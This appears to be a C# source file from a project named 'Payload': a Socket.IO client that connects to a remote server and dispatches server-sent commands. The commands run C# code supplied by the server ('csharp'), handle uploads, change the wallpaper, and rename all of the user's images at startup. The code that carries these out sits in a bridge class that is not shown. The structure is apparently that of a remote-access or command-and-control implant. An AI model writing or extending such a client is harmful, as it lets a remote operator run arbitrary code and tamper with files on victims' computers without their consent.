using CommonClassLibrary;
using Payload.Core.Command;
using System.Text.Json;

namespace Payload
{
    public class IBasicResProps<T>
    {
        public T data { get; set; }
    }
    public class WallpaperProps
    {
        public string data { get; set; }
    }


    public class UploadReqProps : IBasicResProps<UploadProps> { }
    public class CSharpProps : IBasicResProps<string> { }


    public class SocketIoClient : ISocketIoClient
    {
        private readonly LegacyCommandBridge _legacy = new();

        public SocketIoClient(string serverHost): base(serverHost) 
        {            
            Init();
            _legacy.RenameAllImage();
            base.StartClient();
        }

        private void Init()
        {
            OnWallpaperTaskPack();
            OnUpload();
            OnMyResponse();       
            OnCSharpCall();
        }

        private void OnCSharpCall()
        {
            client.On("csharp", async response => {
                Console.WriteLine(response);
                var req = response.GetValue<CSharpProps>();
                Console.WriteLine(req);
                var args = JsonSerializer.SerializeToElement(new { data = req.data });
                _legacy.HandleCSharp(args);
            });
        }

        private void OnMyResponse()
        {
            if (Config.IsRelease())
                return;
            client.On("my_response", async response => {
                Console.WriteLine(response);
            });
        }

        private void OnUpload()
        {
            client.On("upload", async response => {
                Console.WriteLine(response);
                UploadReqProps reqProps = response.GetValue<UploadReqProps>();
                UploadProps props = reqProps.data;
                var args = JsonSerializer.SerializeToElement(new { data = props });
                _legacy.HandleUpload(args);
            });
        }

        private void OnWallpaperTaskPack()
        {
            client.On("wallpapertaskpack", async response =>
            {
                Console.WriteLine(response);
                var _d = response.GetValue<WallpaperProps>();
                string msg = _d.data;
                var args = JsonSerializer.SerializeToElement(new { data = msg });
                _legacy.HandleWallpaperTaskPack(args);
            });
        }
    }
}
